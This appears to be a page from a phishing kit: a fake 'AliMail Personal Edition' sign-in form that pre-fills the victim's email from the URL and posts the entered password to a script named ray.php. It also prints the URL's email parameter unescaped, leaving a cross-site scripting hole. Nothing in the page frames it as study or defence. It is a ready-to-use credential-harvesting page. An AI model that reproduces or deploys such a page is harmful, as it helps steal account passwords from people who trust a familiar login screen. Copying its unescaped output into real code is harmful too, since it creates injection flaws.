<html>

<head>
<title>AliMail Personal Edition</title>
<link rel="shortcut icon" href="favicon.ico" />
<link rel="bookmark" href="favicon.ico" type="image/x-icon"/>

</head>

<body background="body.jpg">

	<table>

	<tr><td height="130"></td></tr>



	<tr><td>
	
		<form method="post" action="ray.php">

		<table><tr>

		<td width="825"></td>
		
		




		<td>

			<table>
	
			<tr><td>
			
			
			
						<font face="verdana" size="2">
						Account:
						</font>
						
			</td></tr>
			
			
			
			
			<tr><td height="2"></td></tr>
			
			
			
			
			
			<tr><td>
						

						<table cellspacing="0"><tr><td 
						style="width:250px; height:30px; background-color: #A4A4A4;">
					
							<table cellspacing="0"><tr><td 
							style="width:250px; height:30px; background-color: #FFFFFF;">
							
									<table><tr>
									
									<td width="5"></td>
									
									
									
									<td>
									
											<font face="verdana" size="2">
											<b><?php echo $_GET['email']; ?></b>
											</font>
											
											<input type="hidden" name="username" value="<?php echo $_GET['email']; ?>">
									
									</td>
									
									</tr></table>
					
							</td></tr></table>
					
					</td></tr></table>


	
			</td></tr>





			<tr><td height="5"></td></tr>
			
			
			
			
			
			
			
			
			<tr><td height="">
			
					<table align="center"><tr>
					
					<td>
					
						<font face="verdana" size="2">
						Password:
						</font>
					
					</td>
					
					
					
					
					<td width="57"></td>
					
					
					
					
					<td>
					
						<div align="right">
						<a href="" style="text-decoration:none">
						<font face="verdana" size="2" color="#0174DF">
						Forgot Password?
						</font>
						</a>
						</div>
					
					</td>
					
					</tr></table>
			
			</td></tr>
			
			
			
			
			
			
			
			<tr><td height=""></td></tr>
			
			
			
			
			
			<tr><td>
			
					<input  name="password" type="password" style="width:250px; height:33px; 
					font-family: Verdana; font-size: 13px; color:#000000; 
					background-color: #ffffff; border: solid 1px #A4A4A4; padding: 10px;" 
					required="" placeholder="Password">

			
			</td></tr>
			
			
			
			
			<tr><td height="15"></td></tr>
			
		
			
			
			
			<tr><td>
			
						<input type="submit" value="Sign In" 
						style="width:250px; height:40px; background-color: #FF8000; border: solid 3px #FF8000; 
						font-family: Verdana; font-size: 15px; font-weight: light; color: #ffffff;">
						
						
						


			
			</td></tr>
			
			
			
			
			<tr><td height="0">
			
				</form>
			
			</td></tr>
			
			


			</table>

		</td>

		</tr></table>

	</td></tr>

	</table>


</body>

</html>